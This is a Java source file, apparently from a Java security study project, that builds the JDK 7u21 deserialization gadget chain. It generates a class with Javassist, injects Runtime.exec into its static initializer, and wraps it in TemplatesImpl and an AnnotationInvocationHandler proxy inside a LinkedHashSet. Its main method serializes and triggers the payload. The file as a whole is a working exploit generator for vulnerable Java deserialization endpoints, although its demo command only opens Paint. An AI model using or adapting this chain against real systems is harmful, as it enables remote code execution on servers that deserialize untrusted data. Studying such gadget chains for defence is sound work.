package com.pinger.javasec.common;

import com.pinger.javasec.util.SerialUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.util.Map;
import javax.xml.transform.Templates;

/**
 * @author : p1n93r
 * @date : 2021/7/27 0:05
 * 还未测试....
 */
public class Jdk7u21 {


    /**
     * 需要一个空类作为javassist的模板
     */
    public static class Placeholder {}

    public static Object getObject(final String command) throws Exception {

        String abstractTransletClassPath = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";

        // 使用javassist生成一个恶意的类
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(CC2.Placeholder.class));
        classPool.insertClassPath(new ClassClassPath(Class.forName(abstractTransletClassPath)));

        CtClass placeholder = classPool.get(CC2.Placeholder.class.getName());
        placeholder.setSuperclass(classPool.get(Class.forName(abstractTransletClassPath).getName()));
        // 这里insertBefore还是After都一样，反正都是在静态初始化块里写代码
        placeholder.makeClassInitializer().insertBefore("java.lang.Runtime.getRuntime().exec(\"mspaint\");");
        placeholder.setName("EvalClass");
        // 得到恶意类的字节码
        byte[] evalByte = placeholder.toBytecode();

        final Object templates = TemplatesImpl.class.getConstructor(new Class[0]).newInstance();
        Class clazz = templates.getClass();
        // 将恶意字节码填充到TemplatesImpl对象中
        Field bytecodes = clazz.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates,new byte[][]{evalByte});

        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        // 创建AnnotationInvocationHandler对象
        Class<?> handlerClazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = handlerClazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, map);
        Class<? extends InvocationHandler> invocationHandlerClazz = invocationHandler.getClass();
        Field typeField = invocationHandlerClazz.getDeclaredField("type");
        typeField.setAccessible(true);
        typeField.set(invocationHandler,Templates.class);
        Templates proxy =(Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(), new Class[]{Templates.class}, invocationHandler);
        // maintain order
        LinkedHashSet set = new LinkedHashSet();
        set.add(templates);
        set.add(proxy);

        Class<?> templatesClazz = templates.getClass();
        Field auxClassesField = templatesClazz.getDeclaredField("_auxClasses");
        auxClassesField.setAccessible(true);
        auxClassesField.set(templates,null);

        Field classField = templatesClazz.getDeclaredField("_class");
        classField.setAccessible(true);
        classField.set(templates,null);
        // swap in real object
        map.put(zeroHashCodeStr, templates);

        return set;
    }


    public static void main(String[] args) throws Exception {
        Object payload = getObject("calc");
        SerialUtil.runPayload(payload);
    }


}
